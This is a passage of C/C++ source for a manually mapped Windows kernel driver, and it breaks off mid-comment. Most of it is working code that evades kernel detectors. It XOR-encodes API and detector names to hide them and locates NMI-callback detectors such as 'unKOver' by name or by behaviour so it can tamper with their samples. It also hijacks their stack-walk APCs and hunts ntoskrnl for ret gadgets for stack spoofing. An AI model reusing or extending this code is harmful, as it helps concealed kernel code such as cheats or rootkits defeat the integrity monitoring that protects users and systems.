    PostboxState* S = PostboxStatePtr;
    if (!S) return;
    S->E3.Cpu2 = E3CurrentProcessor();
    volatile uint64_t* A = (volatile uint64_t*) (uintptr_t) E3PageA;
    S->E3.P2 = *A;
    __atomic_store_n(&E3PhaseDone, 2, __ATOMIC_RELEASE);
}

static bool E3WaitDone(long Want)
{
    for (uint64_t i = 0; i < 100000000ull; ++i)
    {
        if (__atomic_load_n(&E3PhaseDone, __ATOMIC_ACQUIRE) == Want) return true;
        __builtin_ia32_pause();
    }
    return false;
}

static void E3FlushPage(address Ipi, uint64_t Va)
{
    PostboxTlbRange Range{ Va, Va + 0x1000 };
    ((FnKeIpiGenericCall) Ipi)(&PostboxFlushTlb, (uint64_t) (uintptr_t) &Range);
}

static void E3RunProbe()
{
    PostboxState* S = PostboxStatePtr;
    if (!S) return;
    S->E3.Magic = 0x4533544C42303031ull;   // "E3TLB001"
    S->E3.Phase = 1;

    uint64_t* PteA = nullptr;
    uint64_t* PteB = nullptr;
    uint64_t OldAffinity = 0;
    constexpr uint64_t PfnMask = 0x000FFFFFFFFFF000ull;

    if (!g_MmAllocateIndependentPages || !g_MmSetPageProtection || !g_MmFreeIndependentPages)
    { S->E3.Phase = 0xE1; return; }

    const address Nt = GetNtoskrnl();
    if (!Nt) { S->E3.Phase = 0xE2; return; }
    E3SetTarget = FindFuncExports(Nt, "KeSetTargetProcessorDpc");
    E3InsertDpc = FindFuncExports(Nt, "KeInsertQueueDpc");
    E3GetProc = FindFuncExports(Nt, "KeGetCurrentProcessorNumberEx");
    const address SetAffinity = FindFuncExports(Nt, "KeSetSystemAffinityThreadEx");
    const address RevertAffinity = FindFuncExports(Nt, "KeRevertToUserAffinityThreadEx");
    const address Ipi = FindFuncExports(Nt, "KeIpiGenericCall");
    if (!E3SetTarget || !E3InsertDpc || !E3GetProc || !Ipi ||
        !SetAffinity || !RevertAffinity)
    { S->E3.Phase = 0xE3; return; }

    E3PageA = (uint8_t*) ((FnMmAllocateIndependentPages) g_MmAllocateIndependentPages)(
        0x1000, 0xFFFFFFFF, 0, 0);
    E3PageB = (uint8_t*) ((FnMmAllocateIndependentPages) g_MmAllocateIndependentPages)(
        0x1000, 0xFFFFFFFF, 0, 0);
    if (!E3PageA || !E3PageB) { S->E3.Phase = 0xE4; goto cleanup; }
    if (!((FnMmSetPageProtection) g_MmSetPageProtection)(E3PageA, 0x1000, 0x04) ||
        !((FnMmSetPageProtection) g_MmSetPageProtection)(E3PageB, 0x1000, 0x04))
    { S->E3.Phase = 0xE5; goto cleanup; }

    for (uint32_t i = 0; i < 0x1000; ++i) { E3PageA[i] = 0x41; E3PageB[i] = 0x42; }

    if (!GetPteForVa(address((uint64_t) (uintptr_t) E3PageA), PteA) ||
        !GetPteForVa(address((uint64_t) (uintptr_t) E3PageB), PteB) || PteA == PteB)
    { S->E3.Phase = 0xE6; goto cleanup; }

    E3PteOld = *PteA;
    E3PteNew = (E3PteOld & ~PfnMask) | (*PteB & PfnMask);
    if ((E3PteOld & 1) == 0 || (E3PteNew & 1) == 0 ||
        ((E3PteOld ^ E3PteNew) & PfnMask) == 0)
    { S->E3.Phase = 0xE7; goto cleanup; }

    E3Pte = PteA;
    S->E3.Va = (uint64_t) (uintptr_t) E3PageA;
    S->E3.PteBefore = E3PteOld;
    S->E3.PteAfter = E3PteNew;

    OldAffinity = ((FnKeSetSystemAffinityThreadEx) SetAffinity)(2);   // CPU 1
    for (uint64_t i = 0; i < 100000000ull && E3CurrentProcessor() != 1; ++i)
        __builtin_ia32_pause();

    ((FnKeInitializeDpc) g_KeInitializeDpc)(&E3Dpc1, &E3DpcPhase1, nullptr);
    ((FnKeInitializeDpc) g_KeInitializeDpc)(&E3Dpc2, &E3DpcPhase2, nullptr);
    ((FnKeSetTargetProcessorDpc) E3SetTarget)(&E3Dpc1, 1);
    ((FnKeSetTargetProcessorDpc) E3SetTarget)(&E3Dpc2, 1);

    __atomic_store_n(&E3PhaseDone, 0, __ATOMIC_RELEASE);
    if (!((FnKeInsertQueueDpc) E3InsertDpc)(&E3Dpc1, nullptr, nullptr))
    { S->E3.Phase = 0xE8; goto cleanup; }
    if (!E3WaitDone(1)) { S->E3.Phase = 0xE9; goto cleanup; }

    E3FlushPage(Ipi, (uint64_t) (uintptr_t) E3PageA);

    __atomic_store_n(&E3PhaseDone, 0, __ATOMIC_RELEASE);
    if (!((FnKeInsertQueueDpc) E3InsertDpc)(&E3Dpc2, nullptr, nullptr))
    { S->E3.Phase = 0xEA; goto cleanup; }
    if (!E3WaitDone(2)) { S->E3.Phase = 0xEB; goto cleanup; }

    S->E3.Phase = 0x100;

cleanup:
    if (E3Pte)
    {
        __atomic_store_n(E3Pte, E3PteOld, __ATOMIC_RELEASE);
        invlpg(address((uint64_t) (uintptr_t) E3PageA));
        E3FlushPage(Ipi, (uint64_t) (uintptr_t) E3PageA);
        E3Pte = nullptr;
    }
    if (E3PageA) ((FnMmFreeIndependentPages) g_MmFreeIndependentPages)(E3PageA, 0x1000);
    if (E3PageB) ((FnMmFreeIndependentPages) g_MmFreeIndependentPages)(E3PageB, 0x1000);
    E3PageA = nullptr;
    E3PageB = nullptr;
    ((FnKeRevertToUserAffinityThreadEx) RevertAffinity)(OldAffinity);
}
#endif

#if defined(NMI_PROBE) || defined(NMI_SANITIZE)
#include <intrin.h>

#pragma pack(push, 1)
struct PostboxTss64
{
    uint32_t Reserved0;
    uint64_t Rsp0;
    uint64_t Rsp1;
    uint64_t Rsp2;
    uint64_t Reserved1;
    uint64_t Ist1;
    uint64_t Ist2;
    uint64_t Ist3;
    uint64_t Ist4;
    uint64_t Ist5;
    uint64_t Ist6;
    uint64_t Ist7;
    uint64_t Reserved2;
    uint16_t Reserved3;
    uint16_t IoMapBase;
};

struct PostboxMachineFrame
{
    uint64_t Rip;
    uint64_t Cs;
    uint64_t Eflags;
    uint64_t Rsp;
    uint64_t Ss;
};
#pragma pack(pop)
#endif

#ifdef NMI_PROBE
// Test-only NMI callback probe. This is the detector-side mechanism from
// donnaskiez/nmi: KeRegisterNmiCallback + HalSendNMI, read the interrupted
// machine frame from the NMI IST stack, then check RIP against
// PsLoadedModuleList. Never part of the shipped build.
using FnKeRegisterNmiCallback = void* (*)(uint8_t (*)(void*, uint8_t), void*);
using FnKeDeregisterNmiCallback = int32_t (*)(void*);
using FnKeQueryActiveProcessorCount = uint32_t (*)(uint32_t*);
using FnKeGetCurrentProcessorNumberEx = uint32_t (*)(void*);
using FnKeInitializeAffinityEx = void (*)(void*);
using FnKeAddProcessorAffinityEx = void (*)(void*, int32_t);
using FnHalSendNMI = void (*)(void*);
using FnKeSetPriorityThread = int32_t (*)(void*, int32_t);

struct PostboxAffinityEx
{
    uint16_t Count;
    uint16_t Size;
    uint32_t Reserved;
    uint64_t Bitmap[20];
};

struct PostboxNmiProbeContext
{
    uint32_t CoreCount;
    uint32_t Reserved;
    address GetProc;
    PostboxNmiProbeCore Core[PostboxNmiProbeMaxCores];
};

static uint8_t PostboxNmiCallback(void* Context, uint8_t Handled)
{
    (void) Handled;
    auto* C = (PostboxNmiProbeContext*) Context;
    if (!C) return 1;

    uint32_t Core = C->GetProc
        ? ((FnKeGetCurrentProcessorNumberEx) C->GetProc)(nullptr)
        : 0;
    if (Core >= C->CoreCount) Core = 0;

    const uint64_t Kpcr = __readmsr(0xC0000101);
    auto* Tss = *(PostboxTss64**) (uintptr_t) (Kpcr + 0x8);
    if (!Tss || !Tss->Ist3) return 1;

    auto* Frame = (PostboxMachineFrame*) (uintptr_t) (Tss->Ist3 - sizeof(PostboxMachineFrame));
    C->Core[Core].Rip = Frame->Rip;
    C->Core[Core].Rsp = Frame->Rsp;
    C->Core[Core].Count++;
    C->Core[Core].User = Frame->Rip <= 0x00007FFFFFFFFFFFull ? 1 : 0;
    return 1;
}

static bool PostboxNmiRipInModule(uint64_t Rip)
{
    const uint64_t Head = PostboxStatePtr ? PostboxStatePtr->Caches.PsLoadedModuleList : 0;
    if (!Head) return false;

    auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
    auto* Link = List->Flink;
    for (uint32_t i = 0; i < 0x1000 && Link && Link != List; ++i)
    {
        if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
        auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        const uint64_t Base = (uint64_t) (uintptr_t) Entry->DllBase;
        const uint64_t Size = Entry->SizeOfImage;
        if (Base && Size && Rip >= Base && Rip < Base + Size) return true;
        Link = Link->Flink;
    }
    return false;
}

static void PostboxNmiSpin(uint32_t Ms)
{
    // Test-only: stay inside the mapped image so an external NMI sampler sees a
    // RIP outside PsLoadedModuleList. 2 GHz is a conservative TSC estimate; the
    // exact duration is not important, only that it outlasts one detector poll.
    if (Ms > 30000) Ms = 30000;
    const address Nt = GetNtoskrnl();
    address SetPriority = 0;
    if (Nt) SetPriority = FindFuncExports(Nt, "KeSetPriorityThread");
    const uint64_t Kpcr = __readmsr(0xC0000101);
    void* Thread = *(void**) (uintptr_t) (Kpcr + 0x188);
    int32_t OldPriority = 0;
    if (SetPriority && Thread)
        OldPriority = ((FnKeSetPriorityThread) SetPriority)(Thread, 31);
    const uint64_t Start = __rdtsc();
    const uint64_t Ticks = (uint64_t) Ms * 2000000ull;
    while ((__rdtsc() - Start) < Ticks)
        __asm__ __volatile__("pause");
    if (SetPriority && Thread)
        ((FnKeSetPriorityThread) SetPriority)(Thread, OldPriority);
}

static uint32_t PostboxNmiProbe(PostboxNmiProbeResult* Out)
{
    if (!Out) return 1;
    __builtin_memset(Out, 0, sizeof(*Out));

    const address Nt = GetNtoskrnl();
    if (!Nt) return 2;

    const address Register = FindFuncExports(Nt, "KeRegisterNmiCallback");
    const address Deregister = FindFuncExports(Nt, "KeDeregisterNmiCallback");
    const address QueryCount = FindFuncExports(Nt, "KeQueryActiveProcessorCount");
    const address GetProc = FindFuncExports(Nt, "KeGetCurrentProcessorNumberEx");
    const address InitAff = FindFuncExports(Nt, "KeInitializeAffinityEx");
    const address AddAff = FindFuncExports(Nt, "KeAddProcessorAffinityEx");
    const address SendNmi = FindFuncExports(Nt, "HalSendNMI");
    if (!Register) return 0x11;
    if (!Deregister) return 0x12;
    if (!QueryCount) return 0x13;
    if (!GetProc) return 0x14;
    if (!InitAff) return 0x15;
    if (!AddAff) return 0x16;
    if (!SendNmi) return 0x17;

    uint32_t Active = ((FnKeQueryActiveProcessorCount) QueryCount)(nullptr);
    if (Active == 0) return 0x20;
    if (Active > PostboxNmiProbeMaxCores) Active = PostboxNmiProbeMaxCores;

    auto* Ctx = (PostboxNmiProbeContext*) ((FnExAllocatePoolWithTag)
        g_ExAllocatePoolWithTag)(0x200 /* NonPagedPoolNx */, sizeof(PostboxNmiProbeContext),
                                 0x696D6E50 /* 'Pnmi' */);
    if (!Ctx) return 0x21;
    __builtin_memset(Ctx, 0, sizeof(*Ctx));
    Ctx->CoreCount = Active;
    Ctx->GetProc = GetProc;

    void* Handle = ((FnKeRegisterNmiCallback) Register)(&PostboxNmiCallback, Ctx);
    if (!Handle)
    {
        PostboxFreePool(Ctx);
        return 0x22;
    }

    PostboxAffinityEx Affinity{};
    _LARGE_INTEGER Delay{};
    Delay.QuadPart = -100 * 10000;      // 100 ms; only one NMI may be active
    for (uint32_t Core = 0; Core < Active; ++Core)
    {
        ((FnKeInitializeAffinityEx) InitAff)(&Affinity);
        ((FnKeAddProcessorAffinityEx) AddAff)(&Affinity, (int32_t) Core);
        ((FnHalSendNMI) SendNmi)(&Affinity);
        PostboxDelayExecutionThread(0, 0, &Delay);
    }

    ((FnKeDeregisterNmiCallback) Deregister)(Handle);

    Out->CoreCount = Active;
    for (uint32_t Core = 0; Core < Active; ++Core)
    {
        Out->Core[Core] = Ctx->Core[Core];
        Out->Core[Core].InModule =
            (Out->Core[Core].Count && !Out->Core[Core].User &&
             PostboxNmiRipInModule(Out->Core[Core].Rip)) ? 1 : 0;
    }

    PostboxFreePool(Ctx);
    return 0;
}
#endif

#ifdef NMI_SANITIZE
// NMI sample sanitizer. KeRegisterNmiCallback stores entries in a singly linked
// list at nt!KiNmiCallbackListHead (newest first); nt!KiProcessNMI calls every
// entry and ORs the return values. The external detector registers its callback
// per IOCTL, so a callback registered by this driver earlier in the list runs
// after the detector's and can rewrite the detector's recorded RIP. No IDT/TSS/
// SSDT, no code hooks, no PatchGuard-protected structure is touched.
using FnNmiRegister = void* (*)(uint8_t (*)(void*, uint8_t), void*);
using FnNmiDeregister = int32_t (*)(void*);
using FnNmiGetProc = uint32_t (*)(void*);

extern "C" uint8_t PostboxNmiSanitizeEntry(void* Context, uint8_t Handled);

// N-21: the NMI API names are stored XOR-SEED encoded like the main resolve
// table, so the mapped image's .rdata carries no plaintext NMI export names.
// Decoded into a stack buffer for the export walk and wiped after use.
static constexpr EncodedName EncodedNmiApis[] = {
    EncodeName("KeRegisterNmiCallback"),
    EncodeName("KeDeregisterNmiCallback"),
    EncodeName("KeGetCurrentProcessorNumberEx"),
};

[[maybe_unused]] static void PostboxNmiDecodeName(const EncodedName& In, char* Out, uint32_t OutSize)
{
    if (!Out || !OutSize) return;
    uint32_t i = 0;
    for (; i + 1 < OutSize && In.Bytes[i]; ++i)
        Out[i] = (char) ((unsigned char) In.Bytes[i] ^ SEED);
    Out[i] = 0;
}

[[maybe_unused]] static void PostboxNmiWipe(void* Data, size_t Size)
{
    volatile uint8_t* P = (volatile uint8_t*) Data;
    while (Size--) *P++ = 0;
}

// Unaligned read helper: the PE header/section table and the KTHREAD stack
// fields are not guaranteed to be naturally aligned, and casting their byte
// pointers to a wider type is undefined and warns under -Wcast-align.
template<typename T>
static T PostboxReadUnaligned(const void* P)
{
    T Value{};
    __builtin_memcpy(&Value, P, sizeof(T));
    return Value;
}

template<typename T>
static void PostboxWriteUnaligned(void* P, T Value)
{
    __builtin_memcpy(P, &Value, sizeof(T));
}

struct PostboxNmiSection
{
    uint64_t Va;
    uint64_t Size;
};

// The detector's KLDR BaseDllName varies by build/path: nmi_callback_handler,
// nmi-callback-handler.sys, etc. Normalize separators and match the stem. The
// stem is encoded so the plaintext module name does not appear in .rdata.
static constexpr EncodedName EncodedDetectorStem = EncodeName("nmicallbackhandler");
static constexpr uint32_t DetectorStemLen = sizeof("nmicallbackhandler") - 1;
static constexpr EncodedName EncodedDetectorStemUnkover = EncodeName("unkover");
static constexpr uint32_t UnkoverStemLen = sizeof("unkover") - 1;

static bool PostboxNmiNameMatches(const _UNICODE_STRING& Name,
                                  const EncodedName& Stem, uint32_t StemLen)
{
    if (!Name.Buffer || (Name.Length & 1)) return false;
    size_t T = 0;
    for (size_t i = 0; i < Name.Length / sizeof(wchar_t) && T < StemLen; ++i)
    {
        wchar_t C = Name.Buffer[i];
        if (C >= L'A' && C <= L'Z') C += 32;
        if (C == L'-' || C == L'_' || C == L'.') continue;
        const char Expected = (char) ((unsigned char) Stem.Bytes[T] ^ SEED);
        if (C != (wchar_t) Expected) return false;
        ++T;
    }
    return T == StemLen;
}

static uint32_t PostboxNmiDetectorKindForName(const _UNICODE_STRING& Name)
{
    if (PostboxNmiNameMatches(Name, EncodedDetectorStem, DetectorStemLen)) return 1;
    if (PostboxNmiNameMatches(Name, EncodedDetectorStemUnkover, UnkoverStemLen)) return 2;
    return 0;
}

static void PostboxNmiFindDetector(PostboxState* S)
{
    S->NmiSanitize.DetectorBase = 0;
    S->NmiSanitize.DetectorSize = 0;
    S->NmiSanitize.DetectorKind = 0;
    const uint64_t Head = S->Caches.PsLoadedModuleList;
    if (!Head) return;
    auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
    auto* Link = List->Flink;
    for (uint32_t i = 0; i < 0x1000 && Link && Link != List; ++i)
    {
        if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
        auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        const uint32_t Kind = PostboxNmiDetectorKindForName(Entry->BaseDllName);
        if (Kind)
        {
            S->NmiSanitize.DetectorBase = (uint64_t) (uintptr_t) Entry->DllBase;
            S->NmiSanitize.DetectorSize = Entry->SizeOfImage;
            S->NmiSanitize.DetectorKind = Kind;
            return;
        }
        Link = Link->Flink;
    }
}

// APC stackwalk countermeasure. unKOver's scanner queues a normal kernel APC
// (KernelRoutine = UkCaptureStackAPC inside Unkover.sys) to every system thread
// and captures RtlCaptureStackBackTrace from the APC. Our mapped threads keep
// kernel APCs disabled while they run mapped code, so the APC stays queued;
// before the region is left this patch redirects the detector's KernelRoutine
// to the neutralizer below. The neutralizer frees the KAPC and suppresses the
// normal routine, so the detector's event is never signaled and no stack is
// captured. Only KAPCs whose KernelRoutine lies inside the detector image are
// touched; other kernel APCs are left alone.
extern "C" void PostboxApcNeutralRoutine(void* Apc, void** NormalRoutine,
                                         void** NormalContext,
                                         void** SystemArgument1,
                                         void** SystemArgument2)
{
    (void) NormalContext;
    (void) SystemArgument1;
    (void) SystemArgument2;
    if (NormalRoutine) *NormalRoutine = nullptr;
    auto* S = PostboxStatePtr;
    if (S && S->Imports.ExFreePool)
        ((FnExFreePool) (uintptr_t) PostboxImportFrom(S, S->Imports.ExFreePool))(Apc);
}

extern "C" void PostboxNeutralizeDetectorApcs()
{
    auto* S = PostboxStatePtr;
    if (!S) return;
    if (!S->NmiSanitize.DetectorBase || !S->NmiSanitize.DetectorSize)
        PostboxNmiFindDetector(S);
    const uint64_t Base = S->NmiSanitize.DetectorBase;
    const uint64_t Size = S->NmiSanitize.DetectorSize;
    if (!Base || !Size) return;

    // Current KTHREAD from KPCR; 19041 layout: KTHREAD+0x98 = ApcState,
    // ApcListHead[KernelMode] = +0x00, KAPC.ApcListEntry = +0x10,
    // KAPC.KernelRoutine = +0x20.
    const uint64_t Kpcr = __readmsr(0xC0000101);
    auto* Thread = *(uint8_t**) (uintptr_t) (Kpcr + 0x188);
    if (!Thread) return;
    auto* Head = (_LIST_ENTRY*) (uintptr_t) (Thread + 0x98);
    auto* Entry = Head->Flink;
    for (uint32_t i = 0; i < 64 && Entry && Entry != Head; ++i)
    {
        auto* Next = Entry->Flink;
        auto* Apc = (uint8_t*) (uintptr_t) Entry - 0x10;
        const uint64_t KernelRoutine = PostboxReadUnaligned<uint64_t>(Apc + 0x20);
        if (KernelRoutine >= Base && KernelRoutine < Base + Size)
        {
            PostboxWriteUnaligned<uint64_t>(
                Apc + 0x20, (uint64_t) (uintptr_t) &PostboxApcNeutralRoutine);
#ifdef NMI_PROBE
            __atomic_add_fetch(&S->NmiSanitize.ApcNeutralized, 1,
                               __ATOMIC_ACQ_REL);
#endif
        }
        Entry = Next;
    }
}

extern "C" void PostboxApcsDisable();
extern "C" void PostboxApcsDisable()
{
    auto* S = PostboxStatePtr;
    if (S && S->Imports.KeEnterCriticalRegion)
        ((FnKeEnterCriticalRegion) (uintptr_t) PostboxImportFrom(
            S, S->Imports.KeEnterCriticalRegion))();
}

extern "C" void PostboxApcsNeutralizeAndEnable()
{
    PostboxNeutralizeDetectorApcs();
    auto* S = PostboxStatePtr;
    if (S && S->Imports.KeLeaveCriticalRegion)
        ((FnKeLeaveCriticalRegion) (uintptr_t) PostboxImportFrom(
            S, S->Imports.KeLeaveCriticalRegion))();
}

// Resolve the loaded module that owns Address. Used by the callback-property
// detector match below, so a renamed detector still yields a valid range.
static bool PostboxNmiModuleForAddress(PostboxState* S, uint64_t Address,
                                       uint64_t* BaseOut, uint64_t* SizeOut)
{
    if (BaseOut) *BaseOut = 0;
    if (SizeOut) *SizeOut = 0;
    if (!S || !Address) return false;
    const uint64_t Head = S->Caches.PsLoadedModuleList;
    if (!Head) return false;
    auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
    auto* Link = List->Flink;
    for (uint32_t i = 0; i < 0x1000 && Link && Link != List; ++i)
    {
        if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
        auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        const uint64_t Base = (uint64_t) (uintptr_t) Entry->DllBase;
        const uint64_t Size = Entry->SizeOfImage;
        if (Base && Size && Address >= Base && Address < Base + Size)
        {
            if (BaseOut) *BaseOut = Base;
            if (SizeOut) *SizeOut = Size;
            return true;
        }
        Link = Link->Flink;
    }
    return false;
}

// N-11: validate a detector context record before writing it. The context is a
// kernel-pool array of 0x18-byte NMI_CONTEXT records; a pointer outside the
// kernel range, a misaligned record, an insane count, or a kernel sample whose
// RIP/RSP is a user address is not the detector layout and must not be touched.
// A user sample (User=1) legitimately carries user RIP/RSP values.
static bool PostboxNmiContextLooksLikeDetector(PostboxState* S, uint64_t Ctx,
                                               uint32_t Core)
{
    if (!S || !Ctx || Ctx < 0xFFFF800000000000ull || (Ctx & 7)) return false;
    const uint64_t ImageBase = S->NmiSanitize.ImageBase;
    const uint64_t ImageSize = S->NmiSanitize.ImageSize;
    if (ImageSize && Ctx >= ImageBase && Ctx < ImageBase + ImageSize) return false;
    const uint64_t NtBase = S->NmiSanitize.NtBase;
    const uint64_t NtSize = S->NmiSanitize.NtSize;
    if (NtSize && Ctx >= NtBase && Ctx < NtBase + NtSize) return false;

    if (S->NmiSanitize.DetectorKind == 2)
    {
        // unKOver NMI_CONTEXT: threadId(+0), numFired(+4), framesCaptured(+8),
        // interruptedRip(+0x10), interruptedRsp(+0x18), stackFrames(+0x20).
        const uint64_t Rec = Ctx + (uint64_t) Core * 0x120ull;
        if (Rec < Ctx) return false;
        const uint8_t* Nmi = (const uint8_t*) (uintptr_t) Rec;
        const uint32_t NumFired = PostboxReadUnaligned<uint32_t>(Nmi + 4);
        const uint16_t Frames = PostboxReadUnaligned<uint16_t>(Nmi + 8);
        const uint64_t NmiRip = PostboxReadUnaligned<uint64_t>(Nmi + 0x10);
        const uint64_t NmiRsp = PostboxReadUnaligned<uint64_t>(Nmi + 0x18);
        if (NumFired > 0x100000) return false;
        if (Frames > 32) return false;
        if (NmiRip && NmiRip < 0xFFFF800000000000ull) return false;
        if (NmiRsp && NmiRsp < 0xFFFF800000000000ull) return false;
        for (uint32_t i = 0; i < Frames; ++i)
        {
            const uint64_t Frame =
                PostboxReadUnaligned<uint64_t>(Nmi + 0x20 + i * 8);
            if (Frame && Frame < 0xFFFF800000000000ull) return false;
        }
        return true;
    }

    const uint64_t Offset = (uint64_t) Core * sizeof(PostboxDetectorNmiContext);
    const uint64_t Rec = Ctx + Offset;
    if (Rec < Ctx) return false;
    const auto* Nmi = (const PostboxDetectorNmiContext*) (uintptr_t) Rec;
    if (Nmi->Count > 0x100000) return false;
    if (Nmi->User > 1) return false;
    if (Nmi->User == 0)
    {
        if (Nmi->Rip && Nmi->Rip < 0xFFFF800000000000ull) return false;
        if (Nmi->Rsp && Nmi->Rsp < 0xFFFF800000000000ull) return false;
    }
    return true;
}

// N-10/N-09 fallback: a renamed detector no longer matches the module-name
// stem, so identify its callback by properties instead: a registered callback
// outside ntoskrnl and outside this image whose context passes the NMI_CONTEXT
// layout check. PASSIVE only (init/work), never the NMI callback.
static bool PostboxNmiFindDetectorByCallback(PostboxState* S)
{
    if (!S || !S->NmiSanitize.ListHead) return false;
    const uint64_t ImageBase = S->NmiSanitize.ImageBase;
    const uint64_t ImageSize = S->NmiSanitize.ImageSize;
    const uint64_t NtBase = S->NmiSanitize.NtBase;
    const uint64_t NtSize = S->NmiSanitize.NtSize;
    uint64_t Entry = *(uint64_t*) (uintptr_t) S->NmiSanitize.ListHead;
    for (uint32_t i = 0; i < 64 && Entry; ++i)
    {
        const uint64_t Next = *(uint64_t*) (uintptr_t) Entry;
        const uint64_t Fn = *(uint64_t*) (uintptr_t) (Entry + 8);
        const uint64_t Ctx = *(uint64_t*) (uintptr_t) (Entry + 0x10);
        if (Fn && Ctx && Fn != (uint64_t) (uintptr_t) &PostboxNmiSanitizeEntry &&
            !(ImageSize && Fn >= ImageBase && Fn < ImageBase + ImageSize) &&
            !(NtSize && Fn >= NtBase && Fn < NtBase + NtSize))
        {
            uint32_t Kind = 0;
            S->NmiSanitize.DetectorKind = 1;
            if (PostboxNmiContextLooksLikeDetector(S, Ctx, 0))
                Kind = 1;
            else
            {
                S->NmiSanitize.DetectorKind = 2;
                if (PostboxNmiContextLooksLikeDetector(S, Ctx, 0))
                    Kind = 2;
            }

            if (Kind)
            {
                uint64_t Base = 0;
                uint64_t Size = 0;
                if (PostboxNmiModuleForAddress(S, Fn, &Base, &Size))
                {
                    S->NmiSanitize.DetectorBase = Base;
                    S->NmiSanitize.DetectorSize = Size;
                    S->NmiSanitize.DetectorKind = Kind;
                    return true;
                }
            }
            S->NmiSanitize.DetectorKind = 0;
        }
        Entry = Next;
    }
    return false;
}

// Locate KiNmiCallbackListHead by decoding KeRegisterNmiCallback's call to
// KiRegisterNmiSxCallback and that function's RIP-relative load of the list head.
[[maybe_unused]] static uint64_t PostboxNmiFindListHead(address Register)
{
    const uint8_t* P = (const uint8_t*) (uintptr_t) Register;
    if (!P || P[0x0D] != 0xE8) return 0;
    const int32_t Rel = PostboxReadUnaligned<int32_t>(P + 0x0E);
    const address KiRegister = Register + 0x12 + Rel;
    if (KiRegister < 0xFFFF800000000000ull) return 0;

    const uint8_t* Q = (const uint8_t*) (uintptr_t) KiRegister;
    for (uint32_t i = 0; i + 7 < 0x120; ++i)
    {
        if (Q[i] == 0x48 && Q[i + 1] == 0x8B && Q[i + 2] == 0x15)
        {
            const int32_t Disp = PostboxReadUnaligned<int32_t>(Q + i + 3);
            const uint64_t Target = KiRegister + i + 7 + Disp;
            if (Target > 0xFFFF800000000000ull) return Target;
        }
    }
    return 0;
}

static void PostboxNmiFindNt(PostboxState* S, address Nt)
{
    S->NmiSanitize.NtBase = (uint64_t) (uintptr_t) Nt;
    S->NmiSanitize.NtSize = 0;
    // Prefer the PE optional header. The module-list cache can legitimately be
    // absent on a failed/partial pre-start path, and without SizeOfImage the
    // gadget scanner cannot run at all.
    {
        const auto* Dos = (const _IMAGE_DOS_HEADER*) (uintptr_t) Nt;
        if (Dos->e_magic == 0x5A4D)
        {
            const auto* Nth = (const _IMAGE_NT_HEADERS64*)
                __builtin_assume_aligned((const uint8_t*) (uintptr_t) Nt + Dos->e_lfanew, 8);
            if (Nth->Signature == 0x00004550 && Nth->OptionalHeader.SizeOfImage)
            {
                S->NmiSanitize.NtSize = Nth->OptionalHeader.SizeOfImage;
                return;
            }
        }
    }
    const uint64_t Head = S->Caches.PsLoadedModuleList;
    if (!Head) return;
    auto* List = (_LIST_ENTRY*) (uintptr_t) Head;
    auto* Link = List->Flink;
    for (uint32_t i = 0; i < 0x1000 && Link && Link != List; ++i)
    {
        if ((uint64_t) (uintptr_t) Link < 0xFFFF800000000000ull) break;
        auto* Entry = CONTAINING_RECORD(Link, _KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if ((uint64_t) (uintptr_t) Entry->DllBase == (uint64_t) (uintptr_t) Nt)
        {
            S->NmiSanitize.NtSize = Entry->SizeOfImage;
            return;
        }
        Link = Link->Flink;
    }
}

// Enumerate the executable sections of the loaded nt image without casting the
// (possibly unaligned) PE header/section table to struct pointers. The header
// and every section are bounds-checked against NtSize.
static uint32_t PostboxNmiExecSections(address Nt, uint64_t NtSize,
                                       PostboxNmiSection* Out, uint32_t Max)
{
    if (!Nt || NtSize < 0x1000 || !Out || Max == 0) return 0;
    auto* Dos = (_IMAGE_DOS_HEADER*) (uintptr_t) Nt;
    if (Dos->e_magic != 0x5A4D) return 0;
    const uint64_t NtHdrOff = (uint64_t) (uint32_t) Dos->e_lfanew;
    if (NtHdrOff < 0x40 || NtHdrOff + 0x18 > NtSize) return 0;
    const uint8_t* Base = (const uint8_t*) (uintptr_t) Nt;
    if (PostboxReadUnaligned<uint32_t>(Base + NtHdrOff) != 0x4550) return 0;
    const uint16_t NumberOfSections =
        PostboxReadUnaligned<uint16_t>(Base + NtHdrOff + 0x06);
    const uint16_t SizeOfOptionalHeader =
        PostboxReadUnaligned<uint16_t>(Base + NtHdrOff + 0x14);
    const uint64_t SecOff = NtHdrOff + 0x18 + SizeOfOptionalHeader;
    if (SecOff > NtSize || (uint64_t) NumberOfSections * 0x28 > NtSize - SecOff)
        return 0;
    const uint8_t* Sec = Base + SecOff;
    uint32_t Count = 0;
    for (uint16_t i = 0; i < NumberOfSections && Count < Max; ++i)
    {
        const uint8_t* S = Sec + (uint64_t) i * 0x28;
        const uint32_t Characteristics = PostboxReadUnaligned<uint32_t>(S + 0x24);
        if (!(Characteristics & 0x20000000u)) continue;   // IMAGE_SCN_MEM_EXECUTE
        const uint64_t Va = (uint64_t) (uintptr_t) Nt +
                            PostboxReadUnaligned<uint32_t>(S + 0x0C);
        const uint64_t Size = PostboxReadUnaligned<uint32_t>(S + 0x08);
        if (Va < (uint64_t) (uintptr_t) Nt || Va + Size > (uint64_t) (uintptr_t) Nt + NtSize)
            continue;
        Out[Count].Va = Va;
        Out[Count].Size = Size;
        ++Count;
    }
    return Count;
}

// First 0xC3 in an executable nt section. Executing at that byte is a valid ret;
// the frame trampoline uses it to pop the original RIP and resume the mapped code.
[[maybe_unused]] static uint64_t PostboxNmiFindRetGadget(address Nt, uint64_t NtSize)
{
    PostboxNmiSection Sections[16] = {};
    const uint32_t Count = PostboxNmiExecSections(Nt, NtSize, Sections, 16);
    for (uint32_t i = 0; i < Count; ++i)
    {
        const uint8_t* P = (const uint8_t*) (uintptr_t) Sections[i].Va;
        for (uint64_t j = 0; j < Sections[i].Size; ++j)
            if (P[j] == 0xC3) return Sections[i].Va + j;
    }
    return 0;
}

#ifdef STACK_SPOOF
// First 5C C3 (pop rsp; ret) in an executable nt section. The call-site
